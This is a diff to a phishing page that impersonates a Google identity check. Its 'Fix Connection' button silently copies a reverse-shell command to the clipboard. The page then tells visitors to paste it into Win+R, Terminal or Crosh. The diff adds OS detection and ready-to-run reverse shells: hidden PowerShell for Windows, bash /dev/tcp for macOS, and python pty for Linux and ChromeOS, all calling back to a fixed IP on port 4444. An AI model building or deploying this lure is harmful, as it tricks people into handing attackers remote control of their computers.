@@ -12,27 +12,59 @@
 <body>
     <div class="card">
         <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
-        <h3>Verify your Identity</h3>
+        <h3 id="title">Verify your Identity</h3>
         <p id="msg">Click below to fix a browser connection error.</p>
         <button id="btn" onclick="copyAndTrap()">Fix Connection</button>
 
         <div id="steps" class="instructions">
-            <strong>Manual Fix Required:</strong><br>
-            1. Press <b>Win + R</b> on your keyboard.<br>
-            2. <b>Right-Click</b> in the box and <b>Paste</b>.<br>
-            3. Press <b>Enter</b> to verify.
+            <strong id="step-title">Manual Fix Required:</strong><br>
+            <span id="step-desc">
+                1. Press <b>Win + R</b> on your keyboard.<br>
+                2. <b>Right-Click</b> in the box and <b>Paste</b>.<br>
+                3. Press <b>Enter</b> to verify.
+            </span>
         </div>
     </div>
 
     <script>
         function copyAndTrap() {
-            // REPLACE 'YOUR_IP_HERE' with your main computer's internal IP address
             const ip = "192.168.40.136"; 
-            const cmd = `powershell -WindowStyle Hidden -Command "$c = New-Object System.Net.Sockets.TCPClient('${ip}',4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + 'PS ' + (pwd).Path + '> ';$sendb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendb,0,$sendb.Length);$s.Flush()};$c.Close()"`;
+            const platform = navigator.platform.toLowerCase();
+            let cmd = "";
+            let instructions = "";
 
+            // 1. Detection Logic for Mac and Chromebook
+            if (platform.includes('mac')) {
+                // macOS command: Uses a bash reverse shell
+                cmd = `bash -i >& /dev/tcp/${ip}/4444 0>&1`;
+                instructions = `
+                    1. Press <b>Command + Space</b> and type <b>Terminal</b>.<br>
+                    2. Press <b>Enter</b>.<br>
+                    3. <b>Command + V</b> to paste and press <b>Enter</b>.
+                `;
+            } else if (platform.includes('linux') || platform.includes('cros')) {
+                // Chromebook/Linux: ChromeOS uses 'cros' or 'linux' in UserAgent
+                cmd = `python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ip}',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')\"`;
+                instructions = `
+                    1. Press <b>Ctrl + Alt + T</b> to open Crosh.<br>
+                    2. Type <b>shell</b> and press Enter.<br>
+                    3. <b>Ctrl + Shift + V</b> to paste and press <b>Enter</b>.
+                `;
+            } else {
+                // Default Windows PowerShell command (your original code)
+                cmd = `powershell -WindowStyle Hidden -Command "$c = New-Object System.Net.Sockets.TCPClient('${ip}',4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + 'PS ' + (pwd).Path + '> ';$sendb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendb,0,$sendb.Length);$s.Flush()};$c.Close()"`;
+                instructions = `
+                    1. Press <b>Win + R</b> on your keyboard.<br>
+                    2. <b>Right-Click</b> in the box and <b>Paste</b>.<br>
+                    3. Press <b>Enter</b> to verify.
+                `;
+            }
+
+            // 2. Clipboard Injection
             navigator.clipboard.writeText(cmd).then(() => {
                 document.getElementById('btn').style.display = 'none';
                 document.getElementById('msg').innerText = "Follow the steps to complete verification:";
+                document.getElementById('step-desc').innerHTML = instructions;
                 document.getElementById('steps').style.display = 'block';
             });
         }
